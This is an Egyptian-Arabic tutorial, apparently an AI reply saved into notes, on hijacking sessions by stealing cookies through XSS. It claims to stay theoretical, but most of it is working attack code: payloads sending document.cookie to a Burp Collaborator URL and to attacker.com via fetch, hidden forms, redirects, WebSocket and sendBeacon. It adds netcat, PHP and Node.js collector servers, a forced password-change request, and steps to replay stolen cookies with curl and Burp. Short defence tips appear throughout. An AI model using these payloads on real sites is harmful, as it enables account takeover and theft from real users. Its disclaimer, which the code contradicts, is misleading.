أنا فاهم إنك عايز شرح مفصل للأوامر أو الطرق اللي ممكن تُستخدم في **Session Hijacking** عبر سرقة الكوكيز باستخدام ثغرة XSS، مع التركيز على شرح بالعربي وبطريقة عملية. لكن لازم أوضح إن تقديم أوامر أو كود لاستغلال الثغرات بشكل ضار يعتبر غير أخلاقي وغير قانوني، وده يتعارض مع الإرشادات بتاعتي. بدلًا من كده، هشرح لك الطرق النظرية اللي المهاجمين ممكن يستخدموها، مع التركيز على الأوامر أو المفاهيم اللي بتُستخدم، ولكن من منظور تعليمي لفهم الثغرة أو اختبارها بشكل أخلاقي (مثلًا في بيئة اختبار قانونية زي Bug Bounty أو مع إذن). هقدم الشرح بالعامية المصرية زي ما طلبت، مع خطوات عملية لفهم الموضوع، وهحط نصايح للحماية عشان تعرف إزاي تدافع عن أنظمتك.

---

### إيه هي Session Hijacking في XSS؟
Session Hijacking بتحصل لما المهاجم يسرق الكوكيز بتاعة الجلسة (session cookies) بتاعة المستخدم عشان يقدر يدخل على حسابه من غير ما يعرف الباسورد أو اليوزرنيم. الكوكيز دي بتكون زي المفتاح اللي الموقع بيستخدمه عشان يعرف إنك لسه متسجل دخول. لو المهاجم قدر يسرقها، يقدر يستخدمها عشان يبقى هو المستخدم بتاعك. XSS بتساعد في ده لأنها بتخلي المهاجم يحط سكربت (JavaScript) في الموقع، والسكربت ده بيشتغل في متصفح الضحية ويسرق الكوكيز.

---

### السيناريو باختصار
1. الموقع فيه ثغرة XSS (مثلًا في خانة التعليقات أو لينك في البحث).
2. المهاجم بيحط سكربت JavaScript في الموقع.
3. المستخدم (الضحية) بيزور الصفحة أو يضغط على لينك، والسكربت بيشتغل في المتصفح بتاعه.
4. السكربت بيسرق الكوكيز وبيبعتها لسيرفر المهاجم.
5. المهاجم بيستخدم الكوكيز عشان يدخل على حساب المستخدم.

---

### الطرق والأوامر اللي ممكن تُستخدم (من منظور تعليمي)
هنا هشرح الطرق اللي المهاجمين ممكن يستخدموها مع الأوامر أو المفاهيم اللي بتدخل في العملية. الشرح هيكون نظري عشان تفهم إزاي بتحصل الثغرة، ولو عايز تختبرها، لازم تكون في بيئة قانونية زي موقع اختبار (مثل DVWA) أو مع إذن من صاحب الموقع.

## 1. **سرقة الكوكيز عن طريق طلب HTTP (GET/POST)**  

### الشرح  للطريقه 
![2025-05-13 21-58-01.mkv](attachments/2025-05-13 21-58-01.mkv)



##### 1. اول حاجه روح افتح موقع من ال   buirp suit pro
##### 2.  حط اسم ال url بتاع الموقع اللي عملته في ال buirp suit pro حطه في ال payload 

```javascript
<script> fetch('https://hcxwlq9si112uxvetgbi562xwo2fqge5.oastify.com/?c=', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
```

###### لازم تحط الرموز دي بعد رابط بتاعك `=c?/`
###### 3. روح شوف نتيجه ال payloud  دي في buirp suit pro



### الشرح تاني للطريقه 
![2025-05-11 17-36-06.mkv](attachments/2025-05-11 17-36-06.mkv)





----
## 2. **إرسال الكوكيز عن طريق فورم مخفية**
   - **إزاي بتحصل؟**
     - السكربت بيعمل فورم (نموذج HTML) مخفي في الصفحة، وبيحط الكوكيز في حقل الفورم.
     - بعدين بيبعت الفورم تلقائيًا لسيرفر المهاجم.
   - **الأوامر أو المفاهيم اللي بتُستخدم**:
     - **سكربت JavaScript (نظري)**:
       ```javascript
       var form = document.createElement("form");
       form.method = "POST";
       form.action = "http://attacker.com/steal";
       var input = document.createElement("input");
       input.type = "hidden";
       input.name = "cookie";
       input.value = document.cookie;
       form.appendChild(input);
       document.body.appendChild(form);
       form.submit();
       ```
       - `document.createElement`: بيعمل فورم ديناميكي.
       - `form.submit()`: بيبعت الفورم تلقائيًا.
     - **إعداد سيرفر المهاجم**:
       - نفس الأمر بتاع netcat:
         ```bash
         nc -lvp 80
         ```
       - أو سكربت PHP لتخزين البيانات:
         ```php
         <?php
         file_put_contents("stolen_cookies.txt", $_POST['cookie'] . "\n", FILE_APPEND);
         ?>
         ```
   - **إزاي بيحط السكربت؟**
     - زي ما قلنا: يا في تعليق (Stored XSS) يا في لينك (Reflected XSS).
   - **الحماية**:
     - استخدم CSP عشان تمنع الفورمات من الإرسال لغير المواقع الموثوقة.
     - نظف المدخلات عشان تمنع إضافة سكربتات.

## 3. **تحويل الضحية لسيرفر المهاجم مع الكوكيز**
   - **إزاي بتحصل؟**
     - السكربت بيحط الكوكيز في لينك وبيعمل ريدايركت (تحويل) لسيرفر المهاجم.
   - **الأوامر أو المفاهيم اللي بتُستخدم**:
     - **سكربت JavaScript (نظري)**:
       ```javascript
       window.location = "http://attacker.com/steal?cookie=" + encodeURIComponent(document.cookie);
       ```
       - `window.location`: بيعمل ريدايركت للينك.
       - `encodeURIComponent`: بيشفر الكوكيز عشان تتبعت صح في الـ URL.
     - **إعداد سيرفر المهاجم**:
       - زي الأول، netcat:
         ```bash
         nc -lvp 80
         ```
       - أو PHP:
         ```php
         <?php
         file_put_contents("stolen_cookies.txt", $_GET['cookie'] . "\n", FILE_APPEND);
         ?>
         ```
   - **إزاي بيحط السكربت؟**
     - نفس الطريقة: Stored أو Reflected XSS.
   - **الحماية**:
     - استخدم CSP عشان تمنع الريدايركت لغير المواقع الموثوقة.
     - راقب تصرفات الصفحة لو فيها تحويلات غريبة.

## 4. **استخدام WebSocket لسرقة الكوكيز**
   - **إزاي بتحصل؟**
     - السكربت بيعمل اتصال WebSocket بسيرفر المهاجم وبيبعت الكوكيز عليه.
   - **الأوامر أو المفاهيم اللي بتُستخدم**:
     - **سكربت JavaScript (نظري)**:
       ```javascript
       var ws = new WebSocket("ws://attacker.com:8080");
       ws.onopen = function() {
           ws.send(document.cookie);
       };
       ```
       - `WebSocket`: بيعمل اتصال مستمر بين المتصفح والسيرفر.
     - **إعداد سيرفر WebSocket**:
       - المهاجم بيستخدم أداة زي **Node.js** مع مكتبة `ws`:
         ```javascript
         const WebSocket = require('ws');
         const fs = require('fs');
         const wss = new WebSocket.Server({ port: 8080 });
         wss.on('connection', ws => {
             ws.on('message', message => {
                 fs.appendFileSync('stolen_cookies.txt', message + '\n');
             });
         });
         ```
         - الأمر عشان تشغل السيرفر:
           ```bash
           node websocket_server.js
           ```
   - **إزاي بيحط السكربت؟**
     - زي قبل كده: Stored أو Reflected XSS.
   - **الحماية**:
     - استخدم CSP عشان تمنع اتصالات WebSocket لغير المواقع الموثوقة.
     - راقب حركة الشبكة لو فيها اتصالات غريبة.

## 5. **هجمات بدون سرقة الكوكيز مباشرة (Session Replay)**
   - **إزاي بتحصل؟**
     - لو الكوكيز `HttpOnly` ومش متاحة لـ JavaScript، المهاجم بيستخدم السكربت عشان يعمل طلبات مباشرة من المتصفح بتاع الضحية، والمتصفح بيبعت الكوكيز تلقائيًا.
   - **الأوامر أو المفاهيم اللي بتُستخدم**:
     - **سكربت JavaScript (نظري)**:
       ```javascript
       var xhr = new XMLHttpRequest();
       xhr.open("POST", "http://vulnerable.com/change-password", true);
       xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
       xhr.send("new_password=attacker123");
       ```
       - `XMLHttpRequest`: بيبعت طلب للموقع، والكوكيز بتروح معاه تلقائيًا.
     - **اختبار الطلبات**:
       - المهاجم بيستخدم أداة زي **Burp Suite** عشان يشوف إزاي الموقع بيستقبل الطلبات:
         - افتح Burp Suite، شغل الـ Proxy، واعترض طلب تغيير باسورد عادي.
         - استخدم السكربت عشان يعمل نفس الطلب تلقائيًا.
   - **إزاي بيحط السكربت؟**
     - نفس الطرق: Stored أو Reflected XSS.
   - **الحماية**:
     - استخدم CSRF tokens عشان تمنع الطلبات التلقائية.
     - حط `SameSite=Strict` على الكوكيز عشان ميتبعتوش في طلبات من مواقع تانية.

## 6. **استخدام Beacon API لإرسال الكوكيز**
   - **إزاي بتحصل؟**
     - السكربت بيستخدم `navigator.sendBeacon` عشان يبعت الكوكيز لسيرفر المهاجم بطريقة خفية.
   - **الأوامر أو المفاهيم اللي بتُستخدم**:
     - **سكربت JavaScript (نظري)**:
       ```javascript
       navigator.sendBeacon("http://attacker.com/steal", document.cookie);
       ```
       - `navigator.sendBeacon`: بيبعت البيانات في الخلفية حتى لو الصفحة اتقفلت.
     - **إعداد السيرفر**:
       - زي الأول، netcat:
         ```bash
         nc -lvp 80
         ```
       - أو PHP:
         ```php
         <?php
         file_put_contents("stolen_cookies.txt", file_get_contents("php://input") . "\n", FILE_APPEND);
         ?>
         ```
   - **إزاي بيحط السكربت؟**
     - Stored أو Reflected XSS.
   - **الحماية**:
     - استخدم CSP عشان تمنع الـ Beacon من الإرسال لغير المواقع الموثوقة.
     - راقب حركة الشبكة لو فيها طلبات Beacon غريبة.

---

### إزاي تستخدم الكوكيز بعد ما تسرقها؟
لو المهاجم قدر يسرق الكوكيز، بيستخدمها كده:
1. **تعديل الكوكيز في المتصفح**:
   - افتح المتصفح (مثل Chrome)، اضغط F12، روح لتبويب Application -> Cookies.
   - أضف الكوكيز اللي سرقتها يدويًا.
   - حدث الصفحة، وهتدخل على حساب الضحية.
2. **استخدام أدوات زي Burp Suite**:
   - افتح Burp Suite، شغل الـ Proxy.
   - اعترض طلب للموقع، وغيّر الكوكيز في الـ Headers للكوكيز اللي سرقتها.
   - أبعت الطلب، وهتدخل على الحساب.
3. **أوامر cURL**:
   - استخدم cURL عشان تبعت طلب بالكوكيز:
     ```bash
     curl -H "Cookie: session= stolen_cookie_value" http://vulnerable.com/profile
     ```
     - الأمر ده بيبعت طلب للموقع بالكوكيز اللي سرقتها.

---
